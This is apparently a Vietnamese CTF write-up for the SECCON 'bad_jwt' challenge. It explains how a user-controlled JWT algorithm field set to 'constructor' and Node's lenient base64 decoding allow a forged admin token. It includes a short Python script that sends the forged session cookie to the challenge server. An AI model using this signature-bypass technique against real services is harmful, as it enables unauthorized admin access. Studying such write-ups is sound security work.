# bad_jwt
Hàm create signature dùng user input làm algorithm.
![image](https://github.com/lemauanhphong/ctf_writeups/assets/91038460/13420af1-35db-4948-8d01-94d4ef1ca95f)

Buffer.from() bỏ qua ký tự nằm ngoài phạm vi base64 character.
![image](https://github.com/lemauanhphong/ctf_writeups/assets/91038460/d7042c93-ced8-4dd8-b0ff-cc41d58e845d)

Xây dựng JWT với trường header, payload như ảnh, còn signature thì nối header payload lại.
![image](https://github.com/lemauanhphong/ctf_writeups/assets/91038460/838ddb61-da28-4bbb-87b1-d836667690aa)


```py
import requests

URL = 'http://bad-jwt.seccon.games:3000/'

payload = 'eyJhbGciOiJjb25zdHJ1Y3RvciJ9.eyJpc0FkbWluIjp0cnVlfQ.eyJhbGciOiJjb25zdHJ1Y3RvciJ9eyJpc0FkbWluIjp0cnVlfQ'
cookies = {'session': payload}

print(requests.get(URL, cookies=cookies).text)
```
